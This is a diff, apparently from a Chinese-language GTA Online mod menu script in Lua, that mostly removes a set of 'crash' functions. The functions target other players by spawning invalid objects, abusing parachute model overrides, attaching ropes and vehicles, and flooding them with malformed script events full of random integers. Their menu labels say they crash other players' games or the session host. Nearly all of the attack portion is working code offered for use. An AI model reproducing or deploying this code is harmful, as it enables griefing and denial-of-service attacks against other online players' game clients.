-	local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-	local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
-    local Object_pizza1 = CreateObject(3613262246, TargetPlayerPos)
-    local Object_pizza2 = CreateObject(2155335200, TargetPlayerPos)
-    local Object_pizza3 = CreateObject(3026699584, TargetPlayerPos)
-    local Object_pizza4 = CreateObject(-1348598835, TargetPlayerPos)
-    for i = 0, 100 do 
-        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
-		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
-		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
-		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
-		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
-        util.yield(10)
-    end
-    util.yield(2000)
-    entities.delete_by_handle(Object_pizza1)
-    entities.delete_by_handle(Object_pizza2)
-    entities.delete_by_handle(Object_pizza3)
-    entities.delete_by_handle(Object_pizza4)
-    end)
-end
-local function OpenParachuteCrash(PlayerID)
-    local user = players.user()
-    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
-    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
-    BlockSyncs(PlayerID, function() 
-        util.yield(100)
-        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
-        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
-        TASK.TASK_PARACHUTE_TO_TARGET(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z)
-        util.yield(200)
-        TASK.CLEAR_PED_TASKS_IMMEDIATELY(SelfPlayerPed)
-        util.yield(500)
-        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 100, false)
-        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
-        util.yield(1000)
-        for i = 1, 5 do
-            util.spoof_script("freemode", SYSTEM.WAIT)
-        end
-        ENTITY.SET_ENTITY_HEALTH(SelfPlayerPed, 0)
-        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, 0, false, false, 0)
-    end)
-end
-local function ChangeParachuteCrash(PlayerID)
-    local user = players.user()
-    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
-    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
-    BlockSyncs(PlayerID, function() 
-        util.yield(100)
-        for i = 0, 110 do
-            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
-            PED.SET_PED_COMPONENT_VARIATION(SelfPlayerPed, 5, i, 0, 0)
-            util.yield(50)
-            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
-        end
-        util.yield(250)
-        for i = 1, 5 do
-            util.spoof_script("freemode", SYSTEM.WAIT)
-        end
-        ENTITY.SET_ENTITY_HEALTH(SelfPlayerPed, 0)
-        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, 0, false, false, 0)
-        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
-    end)
-end
-    menu.action(player_removals, "无效物体崩溃", {}, "崩溃其他玩家游戏", function()
-        menu.trigger_commands("anticrashcam on")
-        InvalidObjectCrash(PlayerID)
-        menu.trigger_commands("anticrashcam off")
-        notification( "崩溃完成", black)
-    end)
-    menu.action(player_removals, "新闻联播V1", {"xinwenV1"}, "", function()
-         YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'xinwen.png')
-      if SCRIPT_MANUAL_START then
-    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
-    logo_alpha = 0
-    logo_alpha_incr = 0.01
-    logo_alpha_thread = util.create_thread(function (thr)
-        while true do
-            logo_alpha = logo_alpha + logo_alpha_incr
-            if logo_alpha > 1 then
-                logo_alpha = 1
-            elseif logo_alpha < 0 then
-                logo_alpha = 0
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-
-    logo_thread = util.create_thread(function (thr)
-        starttime = os.clock()
-        local alpha = 0
-        while true do
-            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.4, 0.5,0, 1, 1, 1, logo_alpha)
-            timepassed = os.clock() - starttime
-            if timepassed > 14 then
-                logo_alpha_incr = -0.01
-            end
-            if logo_alpha == 0 then
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-end
-      store_dir = filesystem.store_dir() .. '\\YMss\\'
-      sound_selection_dir = store_dir .. '\\sound5.txt'
-      if not filesystem.is_dir(store_dir) then
-         util.toast("夜幕音频没有正确安装！.")
-         util.stop_script()
-end
-fp = io.open(sound_selection_dir, 'r')
-local file_selection = fp:read('*a')
-fp:close()
-local sound_location = store_dir .. '\\' .. file_selection
-if not filesystem.exists(sound_location) then
-    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
-else
-    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
-end
-util.keep_running()
-        fragcrash_v1(PlayerID)
-        notification( "崩溃完成", green)
-    end)
-    menu.action(player_removals, "新闻崩溃V2", {"xinwenV2"}, "每天晚上19：00准时播出", function()
-          YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'xinwen.png')
-      if SCRIPT_MANUAL_START then
-    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
-    logo_alpha = 0
-    logo_alpha_incr = 0.01
-    logo_alpha_thread = util.create_thread(function (thr)
-        while true do
-            logo_alpha = logo_alpha + logo_alpha_incr
-            if logo_alpha > 1 then
-                logo_alpha = 1
-            elseif logo_alpha < 0 then
-                logo_alpha = 0
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-
-    logo_thread = util.create_thread(function (thr)
-        starttime = os.clock()
-        local alpha = 0
-        while true do
-            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.4, 0.5,0, 1, 1, 1, logo_alpha)
-            timepassed = os.clock() - starttime
-            if timepassed > 14 then
-                logo_alpha_incr = -0.01
-            end
-            if logo_alpha == 0 then
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-end
-      store_dir = filesystem.store_dir() .. '\\YMss\\'
-      sound_selection_dir = store_dir .. '\\sound5.txt'
-      if not filesystem.is_dir(store_dir) then
-         util.toast("夜幕音频没有正确安装！.")
-         util.stop_script()
-end
-fp = io.open(sound_selection_dir, 'r')
-local file_selection = fp:read('*a')
-fp:close()
-local sound_location = store_dir .. '\\' .. file_selection
-if not filesystem.exists(sound_location) then
-    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
-else
-    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
-end
-util.keep_running()
-        fragcrash_v2(PlayerID)
-        notification( "崩溃完成", green)
-    end)
-    menu.action(player_removals, "病毒崩溃", {}, "崩溃其他玩家游戏", function()
-      util.toast("病毒，快快散去！~")
-    
-		    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
-            local cargobob = CreateVehicle(0XFCFCB68B, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
-            local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
-            local vehicle = CreateVehicle(0X187D938D, TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
-            local vehiclePos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
-            local newRope = PHYSICS.ADD_ROPE(TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
-            PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, vehicle, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehiclePos.x, vehiclePos.y, vehiclePos.z, 2, false, false, 0, 0, "Center", "Center")
-            util.yield(1000)
-            PHYSICS.ROPE_UNLOAD_TEXTURES()
-            entities.delete_by_handle(cargobob)
-            entities.delete_by_handle(vehicle)
-            entities.delete_by_handle(newRope)
-            notification( "崩溃完成", green)
-    end)
-    menu.action(player_removals, "开降落伞崩溃", {}, "崩溃其他玩家游戏", function()
-        OpenParachuteCrash(PlayerID)
-        notification( "崩溃完成", green)
-    end)
-    menu.action(player_removals, "换降落伞崩溃", {}, "崩溃其他玩家游戏", function()
-        ChangeParachuteCrash(PlayerID)
-        notification( "崩溃完成", green)
-    end)
-    menu.action(player_removals, "猪猪侠崩溃", {"zzxcrash"}, "请耐心等待崩溃完成！（约15秒）", function()
-         YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'zhuzhu.png')
-      if SCRIPT_MANUAL_START then
-    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
-    logo_alpha = 0
-    logo_alpha_incr = 0.01
-    logo_alpha_thread = util.create_thread(function (thr)
-        while true do
-            logo_alpha = logo_alpha + logo_alpha_incr
-            if logo_alpha > 1 then
-                logo_alpha = 1
-            elseif logo_alpha < 0 then
-                logo_alpha = 0
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-
-    logo_thread = util.create_thread(function (thr)
-        starttime = os.clock()
-        local alpha = 0
-        while true do
-            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.35, 0.5,0, 3, 3, 3, logo_alpha)
-            timepassed = os.clock() - starttime
-            if timepassed > 10 then
-                logo_alpha_incr = -0.01
-            end
-            if logo_alpha == 0 then
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-end
-      store_dir = filesystem.store_dir() .. '\\YMss\\'
-      sound_selection_dir = store_dir .. '\\sound13.txt'
-      if not filesystem.is_dir(store_dir) then
-         util.toast("夜幕音频没有正确安装！.")
-         util.stop_script()
-end
-fp = io.open(sound_selection_dir, 'r')
-local file_selection = fp:read('*a')
-fp:close()
-local sound_location = store_dir .. '\\' .. file_selection
-if not filesystem.exists(sound_location) then
-    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
-else
-    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
-end
-util.keep_running()
-        lestcrash(PlayerID)
-        dongge(PlayerID)
-        MDS(PlayerID)
- end)
- function M9crash(PlayerID)
-            local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-            local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
-            pos.z = pos.z + 5
-            veh = entities.get_all_vehicles_as_handles()
-            
-          for i = 1, #veh do
-          NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
-          ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
-          TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 777)
-          TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 17, 888)
-          TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
-          end
-      end
-    local wanjiabengkui = menu.list(player_removals, "崩溃崩溃崩溃~~", {}, "")
-    menu.action(wanjiabengkui, "M9崩溃", {"six6crash"}, "M9crash", function()
-        M9crash(PlayerID)
-     end)
----天御崩溃
-function TYcrash(PlayerID)
-    for pedp_crash = 2 , 6 do
-    pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-    pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
-    dune = CreateVehicle(410882957,pos,ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
-    ENTITY.FREEZE_ENTITY_POSITION(dune, true)
-    dune1 = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
-    ENTITY.FREEZE_ENTITY_POSITION(dune1, true)
-    barracks = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
-    ENTITY.FREEZE_ENTITY_POSITION(barracks, true)
-    barracks1 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
-    ENTITY.FREEZE_ENTITY_POSITION(barracks1, true)
-    dunecar = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
-    ENTITY.FREEZE_ENTITY_POSITION(dunecar, true)
-    dunecar1 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
-    ENTITY.FREEZE_ENTITY_POSITION(dunecar1, true)
-    dunecar2 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
-    ENTITY.FREEZE_ENTITY_POSITION(dunecar2, true)
-    barracks3 = CreateVehicle(4244420235,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
-    ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
-    barracks31 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
-    ENTITY.FREEZE_ENTITY_POSITION(barracks31, true)
-    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
-    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks31, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
-    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
-    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
-    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
-    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
-    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
-    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar2, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
-    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar, pedp, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
-    util.yield(5000)
-    for i = 0, 100  do
-        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dunecar, pos.x, pos.y, pos.z, false, true, true)
-            util.yield(10)
-        end
-        util.yield(2000)
-        entities.delete_by_handle(dune)
-        entities.delete_by_handle(dune1)
-        entities.delete_by_handle(barracks)
-        entities.delete_by_handle(barracks1)
-        entities.delete_by_handle(dunecar)
-        entities.delete_by_handle(dunecar1)
-        entities.delete_by_handle(dunecar2)
-        entities.delete_by_handle(barracks3)
-        entities.delete_by_handle(barracks31)
-    end
-end
-     menu.action(wanjiabengkui, "天御崩溃", {"TY"}, "", function()
-        TYcrash(PlayerID)
-     end)
----主机崩
-function hostcrash(PlayerID)
-    local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
-    menu.trigger_commands("tpmazehelipad")
-    ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
-    util.yield(1000)
-    menu.trigger_commands("tpmazehelipad")
-end
-     menu.action(wanjiabengkui, "gaga崩", {}, "崩溃主机（请提前把主机优先级为最低）（主机崩）", function(PlayerID)
-               YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'gaga.png')
-      if SCRIPT_MANUAL_START then
-    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
-    logo_alpha = 0
-    logo_alpha_incr = 0.01
-    logo_alpha_thread = util.create_thread(function (thr)
-        while true do
-            logo_alpha = logo_alpha + logo_alpha_incr
-            if logo_alpha > 1 then
-                logo_alpha = 1
-            elseif logo_alpha < 0 then
-                logo_alpha = 0
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-
-    logo_thread = util.create_thread(function (thr)
-        starttime = os.clock()
-        local alpha = 0
-        while true do
-            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.4, 0.5,0, 1, 1, 1, logo_alpha)
-            timepassed = os.clock() - starttime
-            if timepassed > 3 then
-                logo_alpha_incr = -0.01
-            end
-            if logo_alpha == 0 then
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-end
-        hostcrash(PlayerID)
-     end)
-    menu.action(wanjiabengkui, "none崩溃", {"scriptcrashnone"}, "脚本崩溃", function()
-        local int_min = -2147483647
-        local int_max = 2147483647
-            for i = 1, 15 do
-                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), 
-                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-                math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
+                cur_crash_meth = cur_crash_meth .. cur_crash
                 end
-                util.yield()
-            for i = 1, 15 do
-                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, PlayerID, math.random(int_min, int_max)})
-                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max)})
-                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, PlayerID, math.random(int_min, int_max)})
-                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
-                end
-                menu.trigger_commands("givesh" .. players.get_name(PlayerID))
-                util.yield(100)
-                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
-                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
-                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
-                util.trigger_script_event(1 << PlayerID, {879177392, 3, 7264839016258354765, 10597, 73295, 3274114858851387039, 4862623901289893625, 54483})
-                util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
-    end)
-function ghostcrash(PlayerID)
-    local mdl = util.joaat("apa_mp_apa_yacht")
-    local user = players.user_ped()
-    BlockSyncs(PlayerID, function()
-    util.yield(250)
-    local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
-    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
-    PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
-    Jinx.SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
-    util.yield(50)
-    local pos = players.get_position(PlayerID)
-    pos.z += 300
-    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
-    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
-    repeat
-        util.yield()
-    until PED.GET_PED_PARACHUTE_STATE(user) == 0
-    PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
-    util.yield(50)
-    TASK.CLEAR_PED_TASKS(user)
-    util.yield(50)
-    PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
-    repeat
-        util.yield()
-    until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
-    pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
-    Jinx.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
-    pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos.x, old_pos.y, old_pos.z, false, false)
-    end)
-end
---小鬼崩溃
-function ghostcrash(PlayerID)
-    fishmm = state
-    local TargetPPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-    local TargetPPos = ENTITY.GET_ENTITY_COORDS(TargetPPed)
-    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1992.8982, -780.7021, -0.37660158, false, false, false, false)
-    menu.trigger_commands("levitatepassivemax 0")
-    menu.trigger_commands("levitateassistup 0")
-    menu.trigger_commands("levitateassistdown 0")
-    menu.trigger_commands("noguns")
-    menu.trigger_commands("invisibility on")
-    util.yield(1000)
-    menu.trigger_commands("acfish")
-    util.yield(100)
-    menu.trigger_commands(" on")
-    util.yield(100)
-    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1813897027,15,true,true)
-    util.yield(100)
-    ENTITY.SET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),TargetPPos.x,TargetPPos.y,TargetPPos.z, false, false, false, false)
-    util.yield(100)
-util.yield(9000)
-if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
-    menu.trigger_commands("mpmale")
-else
-    menu.trigger_commands("mpfemale")
-end
-menu.trigger_commands("levitatepassivemax 0.6")
-menu.trigger_commands("levitateassistup 0.6")
-menu.trigger_commands("levitateassistdown 0.6")
-menu.trigger_commands("levitate off")
-menu.trigger_commands("noguns")
-menu.trigger_commands("invisibility off")
-notification("崩溃完成", colors.black)
-while fishmm do
-    util.yield()
-    PAD._SET_CONTROL_NORMAL(0, 25, 1)
-end
-end
-    menu.action(wanjiabengkui, "小鬼崩溃", {"ghostcrash"}, "猫猫", function(state)   
-           YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'xiaogui.png')
-      if SCRIPT_MANUAL_START then
-    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
-    logo_alpha = 0
-    logo_alpha_incr = 0.01
-    logo_alpha_thread = util.create_thread(function (thr)
-        while true do
-            logo_alpha = logo_alpha + logo_alpha_incr
-            if logo_alpha > 1 then
-                logo_alpha = 1
-            elseif logo_alpha < 0 then
-                logo_alpha = 0
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-
-    logo_thread = util.create_thread(function (thr)
-        starttime = os.clock()
-        local alpha = 0
-        while true do
-            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.4, 0.5,0, 1, 1, 1, logo_alpha)
-            timepassed = os.clock() - starttime
-            if timepassed > 3 then
-                logo_alpha_incr = -0.01
-            end
-            if logo_alpha == 0 then
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-end
-        ghostcrash(PlayerID)
-    end)
-    menu.action(wanjiabengkui, "小宇崩溃", {"grief"}, "崩溃玩家.", function()
-        YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'xiaoyu.png')
-        if SCRIPT_MANUAL_START then
-    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
-    logo_alpha = 0
-    logo_alpha_incr = 0.01
-    logo_alpha_thread = util.create_thread(function (thr)
-        while true do
-            logo_alpha = logo_alpha + logo_alpha_incr
-            if logo_alpha > 1 then
-                logo_alpha = 1
-            elseif logo_alpha < 0 then
-                logo_alpha = 0
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-
-    logo_thread = util.create_thread(function (thr)
-        starttime = os.clock()
-        local alpha = 0
-        while true do
-            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.45, 0.5,0, 1, 1, 1, logo_alpha)
-            timepassed = os.clock() - starttime
-            if timepassed > 3 then
-                logo_alpha_incr = -0.01
-            end
-            if logo_alpha == 0 then
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-end
-        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
-		local pos = players.get_position(PlayerID)
-		local mdl = util.joaat("u_m_m_jesus_01")
-		local veh_mdl = util.joaat("oppressor")
-		util.request_model(veh_mdl)
-        util.request_model(mdl)
-			for i = 1, 10 do
-				if not players.exists(PlayerID) then
-					return
-				end
-				local veh = entities.create_vehicle(veh_mdl, pos, 0)
-				local jesus = entities.create_ped(2, mdl, pos, 0)
-				PED.SET_PED_INTO_VEHICLE(jesus, veh, -1)
-				util.yield(100)
-				TASK.TASK_VEHICLE_HELI_PROTECT(jesus, veh, ped, 10.0, 0, 10, 0, 0)
-				util.yield(1000)
-				entities.delete_by_handle(jesus)
-				entities.delete_by_handle(veh)
-			end
-		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
-		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
-    end)
-    menu.action(player_removals, "萝卜崩", {"luobobk"}, "", function()
-        YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'luobo.png')
-        if SCRIPT_MANUAL_START then
-    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
-    logo_alpha = 0
-    logo_alpha_incr = 0.01
-    logo_alpha_thread = util.create_thread(function (thr)
-        while true do
-            logo_alpha = logo_alpha + logo_alpha_incr
-            if logo_alpha > 1 then
-                logo_alpha = 1
-            elseif logo_alpha < 0 then
-                logo_alpha = 0
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-
-    logo_thread = util.create_thread(function (thr)
-        starttime = os.clock()
-        local alpha = 0
-        while true do
-            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.45, 0.5,0, 1, 1, 1, logo_alpha)
-            timepassed = os.clock() - starttime
-            if timepassed > 3 then
-                logo_alpha_incr = -0.01
-            end
-            if logo_alpha == 0 then
-                util.stop_thread()
-            end
-            util.yield()
-        end
-    end)
-end
-        menu.trigger_commands("5gcrash " .. players.get_name(PlayerID))
-        menu.trigger_commands("six6crash " .. players.get_name(PlayerID))
-         notification( "崩溃完成", colors.black)
-    end)
-menu.action(player_removals, "奥义·制裁XPV3", {}, "crashXPV3", function()
-    xp_over(PlayerID)--------来自南瓜
-     notification( "崩溃完成", colors.black)	
-end)
-menu.action(player_removals, "坤坤崩", {"ikuncrash"}, "哎呦~你干嘛~", function()
-         store_dir = filesystem.store_dir() .. '\\YMss\\'
-sound_selection_dir = store_dir .. '\\sound1.txt'
-if not filesystem.is_dir(store_dir) then
-    util.toast("夜幕音频没有正确安装！.")
-    util.stop_script()
-end
-fp = io.open(sound_selection_dir, 'r')
-local file_selection = fp:read('*a')
-fp:close()
-local sound_location = store_dir .. '\\' .. file_selection
-if not filesystem.exists(sound_location) then
-    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
-else
-    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
-end
-util.keep_running()
-        local int_min = -2147483647
-        local int_max = 2147483647
-        for i = 1, 15 do
-            util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, math.random(int_min, int_max), math.random(int_min, int_max), 
-            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
-            math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
-            util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
-            end
-            menu.trigger_commands("givesh" .. players.get_name(PlayerID))
-            util.yield()
-        for i = 1, 15 do
-            util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228, PlayerID, math.random(int_min, int_max)})
-            util.trigger_script_event(1 << PlayerID, {548471420, 3, 804923209, 1128590390, 136699892, -168325547, -814593329, 1630974017, 1101362956, 1510529262, 2, 1875285955, 633832161, -1097780228})
